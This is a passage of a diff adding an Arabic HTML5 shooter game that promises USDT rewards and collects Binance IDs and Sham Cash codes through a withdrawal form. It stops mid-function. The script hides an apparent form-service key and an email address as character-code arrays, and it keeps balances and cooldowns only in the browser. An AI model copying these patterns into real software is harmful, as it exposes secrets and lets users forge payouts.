@@ -1,0 +1,1475 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#0a0a15">
+    <title>لعبة الفضاء — اربح USDT | PAID PLUS</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; -webkit-touch-callout: none; user-select: none; -webkit-user-select: none; font-family: 'Cairo', sans-serif; }
+        html, body { width: 100%; height: 100%; overflow: hidden; background: #000; touch-action: none; position: fixed; overscroll-behavior: none; }
+        #gameCanvas { display: block; width: 100%; height: 100%; background: #000; position: fixed; top: 0; left: 0; touch-action: none; }
+
+        .back-btn {
+            position: fixed; top: 12px; right: 12px; z-index: 100; color: #fff; text-decoration: none;
+            font-size: 12px; font-weight: 800; padding: 8px 16px;
+            background: linear-gradient(135deg, rgba(106,17,203,0.85), rgba(37,117,252,0.85));
+            border-radius: 20px; backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 8px 25px rgba(106,17,203,0.4); display: flex; align-items: center; gap: 5px;
+        }
+        .back-btn:active { transform: scale(0.94); }
+        .back-btn svg { width: 14px; height: 14px; }
+
+        .fullscreen-btn {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 100;
+            display: flex; align-items: center; gap: 8px;
+            background: linear-gradient(135deg, #26a17b, #2ecc71); color: #fff; border: none;
+            padding: 13px 26px; border-radius: 26px; font-family: 'Cairo', sans-serif;
+            font-size: 13px; font-weight: 900; cursor: pointer;
+            box-shadow: 0 12px 35px rgba(38,161,123,0.55); border: 1px solid rgba(255,255,255,0.25);
+        }
+        .fullscreen-btn:active { transform: translateX(-50%) scale(0.94); }
+        .fullscreen-btn svg { width: 16px; height: 16px; }
+
+        .withdraw-float-btn {
+            position: fixed; bottom: 20px; left: 15px; z-index: 100;
+            display: flex; align-items: center; gap: 7px;
+            background: linear-gradient(135deg, #26a17b, #2ecc71); color: #fff; border: none;
+            padding: 13px 20px; border-radius: 24px; font-family: 'Cairo', sans-serif;
+            font-size: 13px; font-weight: 900; cursor: pointer;
+            box-shadow: 0 12px 30px rgba(38,161,123,0.55); border: 1px solid rgba(255,255,255,0.25);
+        }
+        .withdraw-float-btn:active { transform: scale(0.94); }
+        .withdraw-float-btn svg { width: 16px; height: 16px; }
+        .withdraw-float-btn:disabled {
+            background: linear-gradient(135deg, rgba(100,100,100,0.6), rgba(70,70,70,0.6));
+            box-shadow: none; cursor: not-allowed; border-color: rgba(255,255,255,0.1);
+        }
+
+        .cooldown-float {
+            position: fixed; bottom: 20px; right: 15px; z-index: 100; display: none;
+            align-items: center; gap: 7px;
+            background: linear-gradient(135deg, rgba(231,76,60,0.9), rgba(192,57,43,0.9));
+            color: #fff; padding: 11px 16px; border-radius: 22px;
+            font-family: 'Cairo', sans-serif; font-size: 11px; font-weight: 800;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .cooldown-float.show { display: flex; }
+        .cooldown-float svg { width: 14px; height: 14px; }
+        .cooldown-float-timer { font-size: 13px; font-weight: 900; direction: ltr; font-family: 'Cairo', monospace; }
+
+        .withdraw-modal {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.92); backdrop-filter: blur(15px);
+            display: none; align-items: center; justify-content: center; z-index: 9999; padding: 15px; overflow-y: auto;
+        }
+        .withdraw-modal.show { display: flex; }
+
+        .withdraw-content {
+            background: linear-gradient(160deg, #1a1a2e, #0f0f1a); border-radius: 24px;
+            padding: 28px 24px; max-width: 420px; width: 100%; position: relative;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.8); color: #fff;
+        }
+
+        .modal-close {
+            position: absolute; top: 14px; left: 14px; width: 36px; height: 36px;
+            background: rgba(255,255,255,0.08); border: none; border-radius: 50%;
+            cursor: pointer; display: flex; align-items: center; justify-content: center;
+        }
+        .modal-close svg { width: 16px; height: 16px; color: #fff; }
+
+        .modal-title { text-align: center; font-size: 19px; font-weight: 900; margin-bottom: 20px; }
+
+        .withdraw-tabs {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 20px;
+            background: rgba(255,255,255,0.04); padding: 5px; border-radius: 16px;
+        }
+
+        .tab-btn {
+            display: flex; align-items: center; justify-content: center; gap: 7px;
+            padding: 12px 8px; border: none; border-radius: 12px; background: transparent;
+            color: #a0a0b0; font-family: 'Cairo', sans-serif; font-size: 12px; font-weight: 800;
+        }
+        .tab-btn.active { background: linear-gradient(135deg, #6a11cb, #2575fc); color: #fff; }
+        .tab-btn img { width: 22px; height: 22px; object-fit: contain; background: #000; border-radius: 6px; padding: 2px; }
+        .tab-btn.sham.active { background: linear-gradient(135deg, #1a3a6e, #2c5282); }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .frozen-balance {
+            background: linear-gradient(135deg, rgba(38,161,123,0.15), rgba(46,204,113,0.08));
+            border: 2px solid rgba(38,161,123,0.35); border-radius: 16px;
+            padding: 16px; text-align: center; margin-bottom: 16px;
+        }
+        .frozen-label { font-size: 11px; color: #a0a0b0; font-weight: 700; margin-bottom: 6px; }
+        .frozen-amount { font-size: 26px; font-weight: 900; color: #26a17b; direction: ltr; line-height: 1; }
+        .frozen-amount small { font-size: 12px; opacity: 0.85; }
+
+        .form-group { margin-bottom: 14px; }
+        .form-group label { display: block; font-size: 11px; font-weight: 800; margin-bottom: 6px; color: #fff; }
+        .form-group input {
+            width: 100%; padding: 13px 15px; border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 12px; background: rgba(255,255,255,0.04); color: #fff;
+            font-family: 'Cairo', sans-serif; font-size: 14px; font-weight: 700;
+        }
+        .form-group input:focus { outline: none; border-color: #f0b90b; }
+
+        .submit-btn {
+            width: 100%; padding: 15px; border: none; border-radius: 14px;
+            background: linear-gradient(135deg, #f0b90b, #fcd535); color: #1a1a2e;
+            font-family: 'Cairo', sans-serif; font-size: 14px; font-weight: 900;
+            cursor: pointer; margin-top: 16px;
+        }
+        .submit-btn.sham { background: linear-gradient(135deg, #1a3a6e, #2c5282); color: #fff; }
+        .submit-btn:disabled { opacity: 0.6; }
+
+        .success-box { text-align: center; padding: 10px 0; }
+        .success-icon {
+            width: 75px; height: 75px; margin: 0 auto 18px;
+            background: linear-gradient(135deg, #26a17b, #2ecc71); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .success-icon svg { width: 38px; height: 38px; color: #fff; }
+        .success-title { font-size: 19px; font-weight: 900; color: #26a17b; margin-bottom: 10px; }
+        .success-text { font-size: 12px; color: #a0a0b0; line-height: 1.8; margin-bottom: 16px; }
+        .success-text b { color: #26a17b; }
+
+        @media (max-width: 500px) {
+            .withdraw-float-btn { padding: 11px 16px; font-size: 11px; bottom: 16px; left: 12px; }
+            .cooldown-float { padding: 9px 13px; font-size: 10px; bottom: 16px; right: 12px; }
+            .fullscreen-btn { padding: 11px 22px; font-size: 12px; bottom: 16px; }
+        }
+
+        @media (orientation: landscape) and (max-height: 500px) {
+            .fullscreen-btn { display: none !important; }
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="gameCanvas"></canvas>
+
+    <a href="games.html" class="back-btn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/>
+        </svg>
+        الألعاب
+    </a>
+
+    <button class="withdraw-float-btn" id="withdrawBtn" onclick="openWithdraw()" disabled>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        <span id="withdrawText">الحد 0.01</span>
+    </button>
+
+    <div class="cooldown-float" id="cooldownBar">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
+        </svg>
+        <span class="cooldown-float-timer" id="cooldownTimer">24:00:00</span>
+    </div>
+
+    <button class="fullscreen-btn" id="fullscreenBtn" onclick="toggleFullscreen()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+            <path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/>
+        </svg>
+        ملء الشاشة
+    </button>
+
+    <div class="withdraw-modal" id="withdrawModal">
+        <div class="withdraw-content" id="withdrawContent">
+            <button class="modal-close" onclick="closeWithdraw()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
+                </svg>
+            </button>
+            <div class="modal-title">طلب سحب</div>
+            <div class="withdraw-tabs">
+                <button class="tab-btn active" data-tab="binance" onclick="switchTab('binance')">
+                    <img src="Binance_Logo.png" alt="Binance">بينانس
+                </button>
+                <button class="tab-btn sham" data-tab="sham" onclick="switchTab('sham')">
+                    <img src="SHAM.png" alt="Sham Cash">شام كاش
+                </button>
+            </div>
+
+            <div class="tab-content active" id="tab-binance">
+                <div class="frozen-balance">
+                    <div class="frozen-label">المبلغ (بالدولار)</div>
+                    <div class="frozen-amount"><span id="binanceAmount">0.00</span> <small>USDT</small></div>
+                </div>
+                <form id="formBinance" onsubmit="submitWithdraw(event, 'binance')">
+                    <input type="hidden" name="subject" value="طلب سحب USDT - لعبة الفضاء - بينانس" />
+                    <div class="form-group">
+                        <label>Binance ID</label>
+                        <input type="text" name="binance_id" placeholder="أدخل Binance ID" inputmode="numeric" required />
+                    </div>
+                    <input type="hidden" name="message" id="msgBinance" />
+                    <button type="submit" class="submit-btn" id="submitBinance">إرسال طلب السحب</button>
+                </form>
+            </div>
+
+            <div class="tab-content" id="tab-sham">
+                <div class="frozen-balance">
+                    <div class="frozen-label">المبلغ (بالليرة السورية)</div>
+                    <div class="frozen-amount"><span id="shamAmount">0</span> <small>SYP</small></div>
+                </div>
+                <form id="formSham" onsubmit="submitWithdraw(event, 'sham')">
+                    <input type="hidden" name="subject" value="طلب سحب USDT - لعبة الفضاء - شام كاش" />
+                    <div class="form-group">
+                        <label>الاسم</label>
+                        <input type="text" name="sham_name" placeholder="أدخل الاسم" required />
+                    </div>
+                    <div class="form-group">
+                        <label>الكود</label>
+                        <input type="text" name="sham_code" placeholder="أدخل الكود" pattern="[a-zA-Z0-9]+" required />
+                    </div>
+                    <input type="hidden" name="message" id="msgSham" />
+                    <button type="submit" class="submit-btn sham" id="submitSham">إرسال طلب السحب</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        /* ============================================
+           🔒 المفاتيح المشفرة (مخفية)
+        ============================================ */
+        const _K1 = [115, 102, 95, 100, 98, 49, 50, 48, 102, 98, 98];
+        const _K2 = [99, 101, 97, 53, 48, 48, 49, 97, 56, 54, 100, 98];
+        const _K3 = [53, 99, 52, 56];
+        const _EM = [109, 97, 121, 97, 114, 97, 121, 113, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109];
+
+        function _dk() {
+            let s = '';
+            for (let i = 0; i < _K1.length; i++) s += String.fromCharCode(_K1[i]);
+            for (let i = 0; i < _K2.length; i++) s += String.fromCharCode(_K2[i]);
+            for (let i = 0; i < _K3.length; i++) s += String.fromCharCode(_K3[i]);
+            return s;
+        }
+
+        function _de() {
+            let s = '';
+            for (let i = 0; i < _EM.length; i++) s += String.fromCharCode(_EM[i]);
+            return s;
+        }
+
+        /* ============================================
+           الإعدادات
+        ============================================ */
+        const MIN_WITHDRAW = 0.01;
+        const SYP_RATE = 130;
+        const KILL_VALUE = 0.000001;
+        const BOSS_KILL_VALUE = 0.00005;
+        const WITHDRAW_COOLDOWN = 24 * 60 * 60 * 1000;
+
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d', { alpha: false });
+        let DPR = Math.min(window.devicePixelRatio || 1, 2);
+        let viewWidth = window.innerWidth;
+        let viewHeight = window.innerHeight;
+
+        const enemyImg = new Image();
+        let enemyLoaded = false;
+        enemyImg.onload = () => { enemyLoaded = true; };
+        enemyImg.src = 'USDX.png';
+
+        const bossImg = new Image();
+        let bossLoaded = false;
+        bossImg.onload = () => { bossLoaded = true; };
+        bossImg.src = 'USDTX.png';
+
+        let usdtScore = 0;
+        let displayedScore = 0;
+        let bossKilled = 0;
+        let enemiesKilled = 0;
+        const ENEMIES_PER_BOSS = 25;
+
+        const shipHP = { current: 100, max: 100, hitFlash: 0, invulnerable: 0 };
+
+        /* ============================================
+           الأصوات
+        ============================================ */
+        const audioPool = { sounds: [], poolSize: 4, currentIndex: 0, ready: false };
+        function initAudio() {
+            for (let i = 0; i < audioPool.poolSize; i++) {
+                const a = new Audio();
+                a.src = 'XS1.mp3';
+                a.preload = 'auto';
+                a.volume = 0.3;
+                audioPool.sounds.push(a);
+            }
+            audioPool.ready = true;
+        }
+        function playShootSound() {
+            if (!audioPool.ready) return;
+            try {
+                const a = audioPool.sounds[audioPool.currentIndex];
+                a.currentTime = 0;
+                const p = a.play();
+                if (p) p.catch(() => {});
+                audioPool.currentIndex = (audioPool.currentIndex + 1) % audioPool.poolSize;
+            } catch (e) {}
+        }
+
+        const bossFireSound = new Audio('XS3.mp3');
+        bossFireSound.preload = 'auto';
+        bossFireSound.volume = 0.4;
+
+        const bossDeathSound = new Audio('XS2.mp3');
+        bossDeathSound.preload = 'auto';
+        bossDeathSound.volume = 0.6;
+
+        const enemyFireSound = new Audio('XS3.mp3');
+        enemyFireSound.preload = 'auto';
+        enemyFireSound.volume = 0.1;
+
+        function playBossFireSound() { try { bossFireSound.currentTime = 0; const p = bossFireSound.play(); if (p) p.catch(() => {}); } catch (e) {} }
+        function playBossDeathSound() { try { bossDeathSound.currentTime = 0; const p = bossDeathSound.play(); if (p) p.catch(() => {}); } catch (e) {} }
+        function playEnemyFireSound() { try { enemyFireSound.currentTime = 0; const p = enemyFireSound.play(); if (p) p.catch(() => {}); } catch (e) {} }
+
+        let audioUnlocked = false;
+        function unlockAudio() { if (audioUnlocked) return; audioUnlocked = true; initAudio(); }
+
+        /* ============================================
+           المركبات
+        ============================================ */
+        const SHIPS_DATA = [
+            { imgSrc: 'X1.png', glowColor: '#00aaff', coreColor: '#00ffff', bulletType: 'rect', preview: null, loaded: false },
+            { imgSrc: 'X2.png', glowColor: '#aabbcc', coreColor: '#ffffff', bulletType: 'rect', preview: null, loaded: false },
+            { imgSrc: 'X3.png', glowColor: '#00aa44', coreColor: '#00ff88', bulletType: 'rect', preview: null, loaded: false },
+            { imgSrc: 'X4.png', glowColor: '#cc0000', coreColor: '#ff3333', bulletType: 'triangle', preview: null, loaded: false },
+            { imgSrc: 'X5.png', glowColor: '#ffffff', coreColor: '#ffffff', bulletType: 'rect', preview: null, loaded: false },
+            { imgSrc: 'X6.png', glowColor: '#ffcc00', coreColor: '#ffee88', bulletType: 'rect', preview: null, loaded: false }
+        ];
+
+        let selectedShipIndex = 0;
+        let gameState = 'select';
+        let shipImg = new Image();
+        let imageLoaded = false;
+
+        const ship = {
+            x: 0, y: 0, width: 100, height: 50,
+            targetX: 0, targetY: 0,
+            recoil: 0, glow: 0, angle: 0,
+            vx: 0, vy: 0, shake: 0
+        };
+
+        let arena = { x: 0, y: 0, width: 0, height: 0 };
+
+        let scrollY = 0, scrollTargetY = 0, scrollVelocity = 0;
+        let isDragging = false, dragTouchId = null, dragStartY = 0, dragStartScrollY = 0;
+        let lastDragY = 0, lastDragTime = 0, dragMoved = false;
+
+        let isChargingOrb = false, chargeTouchId = null, chargeStartX = 0, chargeCurrentX = 0;
+        let chargeSpeed = 0, lastChargeX = 0, lastChargeTime = 0;
+
+        let shipSpacing = 0, selectShipSize = 0, selectLeftX = 0, selectCenterY = 0;
+        let startButton = { x: 0, y: 0, width: 0, height: 0 };
+
+        const bullets = [];
+        const enemyBullets = [];
+        const powerOrbs = [];
+        const particles = [];
+        const muzzleFades = [];
+        const stars = [];
+        const smokeParticles = [];
+        const enemies = [];
+        const explosions = [];
+
+        let enemySpawnTimer = 0;
+        let enemySpawnInterval = 70;
+        let bossActive = false;
+
+        const leftTouch = { active: false, id: null, x: 0, y: 0 };
+        const rightTouch = { active: false, id: null };
+        let fireInterval = null;
+
+        /* ============================================
+           السحب 24 ساعة
+        ============================================ */
+        let lastWithdrawTime = parseInt(localStorage.getItem('fwvLastWithdraw') || '0');
+        let cooldownInterval = null;
+        const cooldownBar = document.getElementById('cooldownBar');
+        const cooldownTimer = document.getElementById('cooldownTimer');
+
+        function updateCooldown() {
+            const now = Date.now();
+            const remaining = WITHDRAW_COOLDOWN - (now - lastWithdrawTime);
+            if (lastWithdrawTime === 0 || remaining <= 0) {
+                cooldownBar.classList.remove('show');
+                if (cooldownInterval) { clearInterval(cooldownInterval); cooldownInterval = null; }
+                return;
+            }
+            cooldownBar.classList.add('show');
+            const h = Math.floor(remaining / 3600000);
+            const m = Math.floor((remaining % 3600000) / 60000);
+            const s = Math.floor((remaining % 60000) / 1000);
+            cooldownTimer.textContent = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+        }
+
+        function startCooldownWatcher() {
+            if (cooldownInterval) return;
+            cooldownInterval = setInterval(updateCooldown, 1000);
+            updateCooldown();
+        }
+
+        function isWithdrawLocked() {
+            if (lastWithdrawTime === 0) return false;
+            return (Date.now() - lastWithdrawTime) < WITHDRAW_COOLDOWN;
+        }
+
+        /* ============================================
+           القياسات
+        ============================================ */
+        function updateShipSize() {
+            if (!imageLoaded) return;
+            const targetWidth = Math.min(arena.width * 0.13, arena.height * 1.0);
+            const aspect = shipImg.width / shipImg.height;
+            ship.width = targetWidth;
+            ship.height = targetWidth / aspect;
+        }
+
+        function resizeCanvas() {
+            viewWidth = window.innerWidth;
+            viewHeight = window.innerHeight;
+
+            canvas.width = viewWidth * DPR;
+            canvas.height = viewHeight * DPR;
+            canvas.style.width = viewWidth + 'px';
+            canvas.style.height = viewHeight + 'px';
+
+            ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
+            ctx.imageSmoothingEnabled = true;
+            ctx.imageSmoothingQuality = 'low';
+
+            arena.x = 0;
+            arena.width = viewWidth;
+            arena.height = viewHeight;
+            arena.y = 0;
+
+            selectShipSize = Math.min(arena.width * 0.18, arena.height * 0.25);
+            shipSpacing = selectShipSize * 1.7;
+            selectLeftX = arena.x + arena.width * 0.07;
+            selectCenterY = arena.y + arena.height / 2;
+
+            const btnWidth = Math.min(arena.width * 0.28, 180);
+            const btnHeight = Math.min(arena.height * 0.28, 55);
+            startButton = {
+                x: arena.x + arena.width * 0.65 + (arena.width * 0.28 - btnWidth) / 2,
+                y: arena.y + (arena.height - btnHeight) / 2,
+                width: btnWidth,
+                height: btnHeight
+            };
+
+            if (gameState === 'select') {
+                ship.x = arena.x + arena.width / 2;
+                ship.y = arena.y + arena.height / 2;
+                ship.targetX = ship.x;
+                ship.targetY = ship.y;
+            } else {
+                ship.x = Math.min(ship.x, arena.width - ship.width / 2);
+                ship.y = Math.min(ship.y, arena.height - ship.height / 2);
+                ship.targetX = Math.min(ship.targetX, arena.width - ship.width / 2);
+                ship.targetY = Math.min(ship.targetY, arena.height - ship.height / 2);
+            }
+
+            updateShipSize();
+        }
+
+        SHIPS_DATA.forEach((data, index) => {
+            const img = new Image();
+            img.onload = () => {
+                data.preview = img;
+                data.loaded = true;
+                if (index === selectedShipIndex) {
+                    shipImg = img;
+                    imageLoaded = true;
+                    updateShipSize();
+                }
+            };
+            img.src = data.imgSrc;
+        });
+
+        window.addEventListener('resize', resizeCanvas);
+        window.addEventListener('orientationchange', () => setTimeout(resizeCanvas, 150));
+
+        /* ============================================
+           ملء الشاشة
+        ============================================ */
+        function toggleFullscreen() {
+            const el = document.documentElement;
+            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
+                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+                if (screen.orientation && screen.orientation.lock) screen.orientation.lock('landscape').catch(() => {});
+            } else {
+                if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
+                else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+            }
+        }
+
+        /* ============================================
+           اللمس
+        ============================================ */
+        function getTouchPos(touch) {
+            const rect = canvas.getBoundingClientRect();
+            return { x: touch.clientX - rect.left, y: touch.clientY - rect.top };
+        }
+
+        function handleTouchStart(pos, id) {
+            if (gameState === 'select') {
+                if (pos.x >= startButton.x && pos.x <= startButton.x + startButton.width &&
+                    pos.y >= startButton.y && pos.y <= startButton.y + startButton.height) {
+                    startGame();
+                    return;
+                }
+                isDragging = true; dragTouchId = id; dragStartY = pos.y; dragStartScrollY = scrollTargetY;
+                lastDragY = pos.y; lastDragTime = Date.now(); dragMoved = false; scrollVelocity = 0;
+            } else if (gameState === 'playing') {
+                if (pos.x < viewWidth / 2) {
+                    if (!leftTouch.active) {
+                        leftTouch.active = true;
+                        leftTouch.id = id;
+                        leftTouch.x = pos.x;
+                        leftTouch.y = pos.y;
+                        ship.targetX = Math.max(arena.x + ship.width / 2, Math.min(arena.x + arena.width - ship.width / 2, pos.x));
+                        ship.targetY = Math.max(arena.y + ship.height / 2, Math.min(arena.y + arena.height - ship.height / 2, pos.y));
+                    }
+                } else {
+                    if (!rightTouch.active) {
+                        rightTouch.active = true;
+                        rightTouch.id = id;
+                        fireBullet();
+                        fireInterval = setInterval(fireBullet, 120);
+                    }
+                    isChargingOrb = true;
+                    chargeTouchId = id;
+                    chargeStartX = pos.x;
+                    chargeCurrentX = pos.x;
+                    lastChargeX = pos.x;
+                    lastChargeTime = Date.now();
+                    chargeSpeed = 0;
+                }
+            }
+        }
+
+        function handleTouchMove(pos, id) {
+            if (gameState === 'select' && isDragging && id === dragTouchId) {
+                const dy = pos.y - dragStartY;
+                if (Math.abs(dy) > 5) dragMoved = true;
+                scrollTargetY = dragStartScrollY + dy;
+                const now = Date.now();
+                const dt = now - lastDragTime;
+                if (dt > 0) scrollVelocity = (pos.y - lastDragY) / dt;
+                lastDragY = pos.y; lastDragTime = now;
+            } else if (gameState === 'playing') {
+                if (id === leftTouch.id) {
+                    leftTouch.x = pos.x;
+                    leftTouch.y = pos.y;
+                    ship.targetX = Math.max(arena.x + ship.width / 2, Math.min(arena.x + arena.width - ship.width / 2, pos.x));
+                    ship.targetY = Math.max(arena.y + ship.height / 2, Math.min(arena.y + arena.height - ship.height / 2, pos.y));
+                }
+                if (isChargingOrb && id === chargeTouchId) {
+                    const now = Date.now();
+                    const dt = now - lastChargeTime;
+                    if (dt > 0) chargeSpeed = (pos.x - lastChargeX) / dt;
+                    lastChargeX = pos.x; lastChargeTime = now; chargeCurrentX = pos.x;
+                    if (chargeSpeed > 0.8 && chargeCurrentX - chargeStartX > 40) {
+                        firePowerOrb();
+                        isChargingOrb = false;
+                    }
+                }
+            }
+        }
+
+        function handleTouchEnd(id) {
+            if (gameState === 'select' && id === dragTouchId) {
+                isDragging = false; dragTouchId = null;
+                if (dragMoved) scrollTargetY += scrollVelocity * 100;
+                alignToNearest();
+            }
+            if (id === leftTouch.id) { leftTouch.active = false; leftTouch.id = null; }
+            if (id === rightTouch.id) {
+                rightTouch.active = false; rightTouch.id = null;
+                if (fireInterval) { clearInterval(fireInterval); fireInterval = null; }
+            }
+            if (id === chargeTouchId) { isChargingOrb = false; chargeTouchId = null; }
+        }
+
+        canvas.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            unlockAudio();
+            for (let i = 0; i < e.changedTouches.length; i++) {
+                handleTouchStart(getTouchPos(e.changedTouches[i]), e.changedTouches[i].identifier);
+            }
+        }, { passive: false });
+
+        canvas.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+            for (let i = 0; i < e.changedTouches.length; i++) {
+                handleTouchMove(getTouchPos(e.changedTouches[i]), e.changedTouches[i].identifier);
+            }
+        }, { passive: false });
+
+        canvas.addEventListener('touchend', (e) => {
+            e.preventDefault();
+            for (let i = 0; i < e.changedTouches.length; i++) {
+                handleTouchEnd(e.changedTouches[i].identifier);
+            }
+        }, { passive: false });
+
+        canvas.addEventListener('touchcancel', (e) => {
+            e.preventDefault();
+            for (let i = 0; i < e.changedTouches.length; i++) {
+                handleTouchEnd(e.changedTouches[i].identifier);
+            }
+        }, { passive: false });
+
+        canvas.addEventListener('mousedown', (e) => {
+            unlockAudio();
+            const rect = canvas.getBoundingClientRect();
+            handleTouchStart({ x: e.clientX - rect.left, y: e.clientY - rect.top }, 'mouse');
+        });
+        canvas.addEventListener('mousemove', (e) => {
+            const rect = canvas.getBoundingClientRect();
+            const pos = { x: e.clientX - rect.left, y: e.clientY - rect.top };
+            if (isDragging || isChargingOrb) handleTouchMove(pos, 'mouse');
+        });
+        canvas.addEventListener('mouseup', () => handleTouchEnd('mouse'));
+
+        function alignToNearest() {
+            let idx = Math.round(-scrollTargetY / shipSpacing);
+            idx = Math.max(0, Math.min(5, idx));
+            selectedShipIndex = idx;
+            scrollTargetY = -idx * shipSpacing;
+            const data = SHIPS_DATA[idx];
+            if (data.loaded) { shipImg = data.preview; imageLoaded = true; updateShipSize(); }
+        }
+
+        /* ============================================
+           بدء اللعبة
+        ============================================ */
+        function startGame() {
+            gameState = 'playing';
+            ship.x = selectLeftX + selectShipSize / 2;
+            ship.y = selectCenterY;
+            ship.targetX = ship.x;
+            ship.targetY = ship.y;
+            ship.recoil = 0; ship.glow = 0; ship.shake = 0;
+            ship.angle = 0; ship.vx = 0; ship.vy = 0;
+
+            bullets.length = 0; enemyBullets.length = 0; powerOrbs.length = 0;
+            particles.length = 0; muzzleFades.length = 0;
+            enemies.length = 0; explosions.length = 0; smokeParticles.length = 0;
+
+            enemySpawnTimer = 0;
+            bossKilled = 0; enemiesKilled = 0; bossActive = false;
+            shipHP.current = shipHP.max;
+            shipHP.hitFlash = 0; shipHP.invulnerable = 0;
+            usdtScore = 0; displayedScore = 0;
+            updateWithdrawBtn();
+        }
+
+        /* ============================================
+           توليد الأعداء
+        ============================================ */
+        function spawnEnemy() {
+            if (!enemyLoaded) return;
+            const targetWidth = Math.min(arena.width * 0.08, 55);
+            const aspect = enemyImg.width / enemyImg.height;
+            const w = targetWidth;
+            const h = w / aspect;
+            enemies.push({
+                x: arena.width + w / 2,
+                y: h / 2 + Math.random() * (arena.height - h),
+                size: w, width: w, height: h,
+                speed: 1.8 + Math.random() * 1.5,
+                hp: 1, maxHp: 1, hitFlash: 0, isBoss: false,
+                vx: 0, vy: 0,
+                shootTimer: 150 + Math.floor(Math.random() * 150),
+                shootCooldown: 150 + Math.floor(Math.random() * 100)
+            });
+        }
+
+        function spawnBoss() {
+            if (!bossLoaded) return;
+            const targetWidth = Math.min(arena.width * 0.32, 180);
+            const aspect = bossImg.width / bossImg.height;
+            const w = targetWidth;
+            const h = w / aspect;
+            enemies.push({
+                x: arena.width + w / 2, y: arena.height / 2,
+                size: w, width: w, height: h,
+                speed: 0.5, hp: 15, maxHp: 15,
+                hitFlash: 0, isBoss: true,
+                movePhase: 0, moveTimer: 0, baseY: arena.height / 2,
+                shootTimer: 60, shootCooldown: 60,
+                stopped: false, stopX: arena.width * 0.7, recoil: 0
+            });
+            bossActive = true;
+        }
+
+        function spawnSoldiersFromBoss(bx, by) {
+            const count = 6;
+            for (let i = 0; i < count; i++) {
+                const angle = (i / count) * Math.PI * 2;
+                const targetWidth = Math.min(arena.width * 0.08, 55);
+                const aspect = enemyImg.width / enemyImg.height;
+                const w = targetWidth;
+                const h = w / aspect;
+                enemies.push({
+                    x: bx, y: by, size: w, width: w, height: h,
+                    speed: 2 + Math.random() * 1.5, hp: 1, maxHp: 1,
+                    hitFlash: 0, isBoss: false,
+                    vx: Math.cos(angle) * 3, vy: Math.sin(angle) * 3,
+                    spreadTimer: 40, shootTimer: 150, shootCooldown: 150
+                });
+            }
+        }
+
+        /* ============================================
+           الإطلاق
+        ============================================ */
+        function fireBullet() {
+            const data = SHIPS_DATA[selectedShipIndex];
+            const mx = ship.x + ship.width / 2 - 8;
+            const my = ship.y;
+            playShootSound();
+
+            if (data.bulletType === 'triangle') {
+                bullets.push({ x: mx, y: my, vx: 18, vy: (Math.random() - 0.5) * 0.3, life: 150, maxLife: 150, size: 6, type: 'triangle' });
+            } else {
+                bullets.push({ x: mx, y: my, vx: 18, vy: (Math.random() - 0.5) * 0.3, life: 150, maxLife: 150, width: 10, height: 3, type: 'rect' });
+            }
+
+            muzzleFades.push({ x: mx, y: my, radius: 5, maxRadius: 30, life: 10, maxLife: 10, color: data.glowColor, coreColor: data.coreColor });
+
+            for (let i = 0; i < 2; i++) {
+                const angle = (Math.random() - 0.5) * Math.PI * 0.9;
+                const speed = 3 + Math.random() * 5;
+                particles.push({ x: mx, y: my, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, life: 10, maxLife: 10, size: 1.2, color: data.glowColor });
+            }
+
+            ship.recoil = 12;
+            ship.glow = 0.6;
+            ship.shake = 1.5;
+        }
+
+        function firePowerOrb() {
+            const data = SHIPS_DATA[selectedShipIndex];
+            const mx = ship.x + ship.width / 2 - 8;
+            const my = ship.y;
+            playShootSound();
